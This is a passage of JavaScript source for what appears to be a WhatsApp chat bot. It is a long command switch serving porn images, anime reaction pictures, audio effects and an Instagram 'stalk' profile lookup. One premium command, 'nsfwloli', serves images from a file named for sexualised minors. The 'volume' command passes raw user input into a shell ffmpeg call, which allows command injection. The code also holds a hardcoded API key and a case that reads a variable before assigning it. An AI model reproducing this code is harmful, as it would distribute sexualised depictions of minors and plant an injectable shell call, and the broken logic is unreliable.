let jpegThumbnail = await extractImageThumb(imageBuffer)		
let imagepdf = await toPDF(pages)		
await LordVoltage.sendMessage(m.chat, { document: imagepdf, jpegThumbnail, fileName: data.title.english + '.pdf', mimetype: 'application/pdf' }, { quoted: m })
} 
break
case 'jahy':if (prefix === '.') {
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/nsfw/jahy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })}
break
case 'manga':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/nsfw/manga.json'))
var xeonyresult = pickRandom(ahegaonsfw)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'masturbation':if (prefix === '.') {
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/nsfw/masturbation.json'))
var xeonyresult = pickRandom(ahegaonsfw)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })}
break
case 'neko-hentai':if (prefix === '.') {
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/nsfw/neko.json'))
var xeonyresult = pickRandom(ahegaonsfw)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })}
break
case 'neko-hentai2':if (prefix === '.') {
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/nsfw/neko2.json'))
var xeonyresult = pickRandom(ahegaonsfw)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })}
break
case 'nsfwloli':if (prefix === '.') {
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/nsfw/nsfwloli.json'))
var xeonyresult = pickRandom(ahegaonsfw)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })}
break
case 'orgy':if (prefix === '.') {
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/nsfw/orgy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })}
break
case 'panties':if (prefix === '.') {
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/nsfw/panties.json'))
var xeonyresult = pickRandom(ahegaonsfw)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })}
break
case 'pussy':if (prefix === '.') {
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/nsfw/pussy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })}
break
case 'tentacles':if (prefix === '.') {
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/nsfw/tentacles.json'))
var xeonyresult = pickRandom(ahegaonsfw)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })}
break
case 'thighs':if (prefix === '.') {
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/nsfw/thighs.json'))
var xeonyresult = pickRandom(ahegaonsfw)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })}
break
case 'yuri':if (prefix === '.') {
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/nsfw/yuri.json'))
var xeonyresult = pickRandom(ahegaonsfw)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })}
break
case 'zettai':if (prefix === '.') {
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/nsfw/zettai.json'))
var xeonyresult = pickRandom(ahegaonsfw)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })}
break
case 'gifblowjob':if (prefix === '.') {
if (!m.isGroup) return reply(mess.only.group)
if (!AntiNsfw) return replynano(mess.nsfw)
reply(mess.wait)
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff = await fetchBuffer(assss.data.url)
    var bogif = await buffergif(bobuff)
    await LordVoltage.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
    })}
    break
case 'gifhentai':if (prefix === '.') {
if (!m.isGroup) return reply(mess.only.group)
if (!AntiNsfw) return replynano(mess.nsfw)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/nsfw/gifs.json'))
var xeonyresultx = pickRandom(ahegaonsfw)
    await LordVoltage.sendMessage(m.chat,{video:xeonyresultx, gifPlayback:true },{quoted:m}).catch(err => {
    })}
    break
    case 'gifs': case 'foot': {if (prefix === '.') {
if (!m.isGroup) return reply(mess.only.group)
if (!AntiNsfw) return replynano(mess.nsfw)
reply(mess.wait)
let heyy
    let yeha = heyy[Math.floor(Math.random() * heyy.length)]
    if (/gifs/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gifs.json')
    if (/foot/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/foot.json')
LordVoltage.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}}
break
case 'animeawoo':{if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`)       
            await LordVoltage.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}}
break
case 'animemegumin':{if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/megumin`)       
            await LordVoltage.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}}
break
case 'animeshinobu':{if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`)       
            await LordVoltage.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}}
break
case 'animehandhold':{if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/handhold`)       
            await LordVoltage.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}}
break
case 'animehighfive':{if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`)       
            await LordVoltage.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}}
break
case 'animecringe':{if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cringe`)       
            await LordVoltage.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}}
break
case 'animedance':{if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`)       
            await LordVoltage.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}}
break
case 'animehappy':{if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`)       
            await LordVoltage.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}}
break
case 'animeglomp':{if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`)       
            await LordVoltage.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}}
break
case 'animesmug':{if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`)       
            await LordVoltage.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}}
break
case 'animeblush':{if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`)       
            await LordVoltage.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}}
break
case 'animewave':{if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`)       
            await LordVoltage.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}}
break
case 'animesmile':{if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`)       
            await LordVoltage.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}}
break
case 'animepoke':{if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`)       
            await LordVoltage.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}}
break
case 'animewink':{if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`)       
            await LordVoltage.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})}
}
break
case 'animebonk':{if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`)       
            await LordVoltage.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}}
break
case 'animebully':{if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`)       
            await LordVoltage.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}}
break
case 'animeyeet':{if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`)       
            await LordVoltage.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}}
break
case 'animebite':{if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`)       
            await LordVoltage.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}}
break
case 'animelick':{if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`)       
            await LordVoltage.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}}
break
case 'animekill':{if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`)       
            await LordVoltage.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})}
}
break
case 'animecry':{if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cry`)       
            await LordVoltage.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}}
break
case 'animewlp':{if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)       
            await LordVoltage.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}}
break
case 'animekiss':{if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`)       
            await LordVoltage.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}}
break
case 'animehug':{if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`)       
            await LordVoltage.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}}
break



case 'animeneko':{if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`)       
            await LordVoltage.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}}
break
case 'animepat':{if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`)       
            await LordVoltage.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}}
break
case 'animeslap':{if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`)       
            await LordVoltage.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}}
break
case 'animecuddle':{if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`)       
            await LordVoltage.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}}
break
case 'animewaifu':{if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)       
            await LordVoltage.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}}
break
case 'animenom':{if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/nom`)       
            await LordVoltage.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}}
break
case 'animefoxgirl':{if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`)       
            await LordVoltage.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}}
break
case 'animetickle': {if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/tickle`)     
            await LordVoltage.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}}
break
case 'animegecg': {if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/gecg`)     
            await LordVoltage.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}}
break
case 'dogwoof': {if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/woof`)     
            await LordVoltage.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}}
break
case '8ballpool': {if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/8ball`)     
            await LordVoltage.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}}
break
case 'goosebird': {if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/goose`)     
            await LordVoltage.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}}
break
case 'animefeed': {if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/feed`)     
            await LordVoltage.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}}
break
case 'animeavatar': {if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`)     
            await LordVoltage.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}}
break
case 'lizardpic': {if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/lizard`)     
            await LordVoltage.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}}
break
case 'catmeow': {if (prefix === '.') {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/meow`)     
            await LordVoltage.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}}
break
    
case 'emoji': {if (prefix === '.') {
if (!args.join(" ")) return replynano('Where is the emoji?')
emoji.get(args.join(" ")).then(async(emoji) => {
let mese = await LordVoltage.sendMessage(m.chat, {image:{url:emoji.images[4].url}, caption: `Made by ${global.botname}`}, {quoted:m})
await LordVoltage.sendMessage(from, {text:"reply #s to this image to make sticker"}, {quoted:mese})
})
}}
break
case 'volume': {if (prefix === '.') {
if (!args.join(" ")) return replynano(`Example: ${prefix + command} 10`)
media = await LordVoltage.downloadAndSaveMediaMessage(quoted, "volume")
if (isQuotedAudio) {
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replynano('Error!')
jadie = fs.readFileSync(rname)
LordVoltage.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
} else if (isQuotedVideo) {
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replynano('Error!')
jadie = fs.readFileSync(rname)
LordVoltage.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
} else {
replynano("Send video/audio")
}
}}
break
 case 'tinyurl':{if (prefix === '.') {
   if(!q) return replynano('link?')
   const request = require('request')
   request(`https://tinyurl.com/api-create.php?url=${q}`, function (error, response, body) {
   try {
  replynano(body)
  } catch (e) {
  replynano(e)
  }
  })
  }}
 break
case 'git': case 'gitclone':if (prefix === '.') {
if (!args[0]) return replynano(`Where is the link?\nExample :\n${prefix}${command} https://github.com/FAMOUS-TECH-DEV/SHADOW-XMD-PAIR-SESSION-V1`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return replynano(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    LordVoltage.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => replynano(mess.error))}
break
case 'spotify': 
case 'spotifysearch': 
case 'spotifys': {if (prefix === '.') {
  if (!text) return reply('Enter song/artist title!');
  const result = await searchSpotify(text);
  const searchResults = result.map((song, index) => `${index + 1}. ${song.name}\nArtist: ${result.artis}\n Link: ${song.link}\n\n`);
  reply(`Spotify Search Results for "${text}":\n\n` + searchResults.join(''));
}}
break;
case 'spdl': case 'spotifydl': {if (prefix === '.') {
if (!text) return reply('Enter Link')
let result = await spotifydl(text)
let captionvid = `∘ Title: ${result.title}\n∘ Artist: ${result.artis}\n∘ Type: ${result.type}\n\n*SPARK MD*`
 const p = await new canvafy.Spotify()
            .setTitle(result.title)
            .setAuthor("Spotify - Downloader")
            .setTimestamp(40, 100)
            .setOverlayOpacity(0.8)
            .setBorder("#fff", 0.8)
            .setImage(result.image)
            .setBlur(3)
            .build(); 

       await LordVoltage.sendMessage(from, { image: p, caption: captionvid }, { quoted: m })
    LordVoltage.sendMessage(m.chat, { audio: { url: result.download}, mimetype: 'audio/mpeg', filename: 'MP3 BY ' + '*SHADØW-XMD*' }, { quoted: m });
}}
break
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':if (prefix === '.') {
    try {
        let set;
        if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20';
        else if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log';
        else if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3';
        else if (/earrape/.test(command)) set = '-af volume=12';
        else if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"';
        else if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"';
        else if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25';
        else if (/reverse/.test(command)) set = '-filter_complex "areverse"';
        else if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"';
        else if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"';
        else if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"';
        else if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"';
        if (set) {
            if (/audio/.test(mime)) {
                await reply(mess.wait);
                let media = await LordVoltage.downloadAndSaveMediaMessage(quoted);
                let ran = getRandom('.mp3');
                console.log(`Running ffmpeg command: ffmpeg -i ${media} ${set} ${ran}`);
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                    fs.unlinkSync(media);
                    if (err) {
                        console.error(`ffmpeg error: ${err}`);
                        return replynano(err);
                    }
                    
                    let buff = fs.readFileSync(ran);
                    LordVoltage.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: m });
                    fs.unlinkSync(ran);
                });
            } else {
                replynano(`Reply to the audio you want to change with a caption *${prefix + command}*`);
            }
        } else {
            replynano('Invalid command');
        }
    } catch (e) {
        replynano(e);
    }}
    break
case 'define': 
if (!q) return replynano(`What do you want to define?`)
try {
targetfine = await axios.get(`http://api.urbandictionary.com/v0/define?term=${q}`)
if (!targetfine) return replynano(mess.error)
let reply =`
*${themeemoji} Word:* ${q}
*${themeemoji} Definition:* ${targetfine.data.list[0].definition
    .replace(/\[/g, "")
    .replace(/\]/g, "")}
*${themeemoji} Example:* ${targetfine.data.list[0].example
    .replace(/\[/g, "")
    .replace(/\]/g, "")}`
   LordVoltage.sendMessage(m.chat,{text:reply},{quoted:m})
} catch (err) {
    console.log(err)
    return replynano(`*${q}* isn't a valid text`)
    }
    break
case 'rate': {
            	if (!text) return replynano(`Example : ${prefix + command} my profile`)
            	let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
let kah = ra[Math.floor(Math.random() * ra.length)]
let jawab = `*Rate ${text}*\nAnswer : ${kah}%`
            await replynano(jawab)
            }
            break
       case 'uptime':
       case 'runtime': {
  if (prefix === '.') {   
  const uptime = getUptime(); 
    const uptimeText = `\u{1F550} Bot Uptime:\n${uptime}`;
    LordVoltage.sendMessage(m.chat, { text: uptimeText, contextInfo: channelContextInfo }, { quoted: fkontak });
  }
}
break;
            case 'stupidcheck':case 'uncleancheck':
case 'hotcheck': case 'smartcheck':
case 'greatcheck':
case 'evilcheck':case 'dogcheck':
case 'coolcheck':
case 'waifucheck':if (prefix === '.') {
cantik = body.slice(1)
const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const xeonkak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
LordVoltage.sendMessage(m.chat, { text: xeonkak }, { quoted: m })}
break
           case 'jodoh':
            case 'jodohku': {if (prefix === '.') {
            if (!m.isGroup) return reply(mess.only.group)
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
LordVoltage.sendMessage(m.chat,
{ text: `👫Your Soulmate Is

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`,
contextInfo:{
mentionedJid:[me, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnailUrl": 'https://img1.pixhost.to/images/5719/598093240_spark.png',
"sourceUrl": `${wagc}`}}},
{ quoted: m})        
            }}
            break
 case 'couple': {
            if (!m.isGroup) return reply(mess.only.group)
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
LordVoltage.sendMessage(m.chat,
{ text: `@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}Aww Dont They look Cute Together 💞`,
contextInfo:{
mentionedJid:[orang, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
thumbnailUrl: `${global.thumbnail}`,
"sourceUrl": `${wagc}`}}},
{ quoted: m})        
            }
            break
    case 'coffee': case 'kopi': {if (prefix === '.') {
LordVoltage.sendMessage(m.chat, {caption: mess.success, image: { url: 'https://coffee.alexflipnote.dev/random' }}, { quoted: m })
            }}
            break
            case 'wallpaper': {if (prefix === '.') {
if (!text) return replynano('Enter Query Title')
reply(mess.wait)
		let { wallpaper } = require('./lib/scraper')
anuwallpep = await wallpaper(text)
result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]
LordVoltage.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Category : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] }} , { quoted: m })
            }}
            break
            case 'wikimedia': {if (prefix === '.') {
if (!text) return replynano('Enter Query Title')
reply(mess.wait)
		let { wikimedia } = require('./lib/scraper')
let anumedia = await wikimedia(text)
result = anumedia[Math.floor(Math.random() * anumedia.length)]
LordVoltage.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Source : ${result.source}\n${themeemoji} Media Url : ${result.image}`, image: { url: result.image }} , { quoted: m })
            }}
            break
            case 'pick': {if (prefix === '.') {
            	if (!m.isGroup) return reply(mess.only.group)
            	if (!text) return replynano(`What do you want to pick?\nExample: ${prefix + command} idiot`)
             const groupMetadata = m.isGroup ? await LordVoltage.groupMetadata(m.chat)
 .catch((e) => {}) : ""
             const participants = m.isGroup ? await groupMetadata.participants : ""
             let member = participants.map((u) => u.id)
             let me = m.sender
             let xeonshimts = member[Math.floor(Math.random() * member.length)]
             LordVoltage.sendMessage(from, { 
text: `The most *${text}* here is *@${xeonshimts.split("@")[0]}*`,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[xeonshimts],
"externalAdReply": {
"showAdAttribution": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"containsAutoReply": true,
"previewType": "PHOTO",
"thumbnailUrl": ``,
thumbnailUrl: `${global.thumbnail}`,
"sourceUrl": `${wagc}`
}
}
}, { quoted: m })
         }}
     break
case 'instagramstalk':
case 'igstalk': {if (prefix === '.') {
if (!args[0]) return replynano(`Enter Instagram Username\n\nExample: ${prefix + command} `)
const data = await fetchJson(`https://skizo.tech/api/igstalk?apikey=nanogembul&user=${encodeURIComponent(text)}`)
LordVoltage.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
    try {
    let res = await fg.igStalk(args[0])
    let te = `
┌──「 *STALKING* 
▢ *🔖Name:* ${data.fullname} 
▢ *🔖Username:* ${data.username}
▢ *👥Follower:* ${data.followers}
▢ *🫂Following:* ${data.following}
▢ *📌Bio:* ${data.bio}
▢ *🏝️Posts:* ${data.posts}
▢ *🔗 Link* : https://instagram.com/${data.username.replace(/^@/, '')}
└────────────`
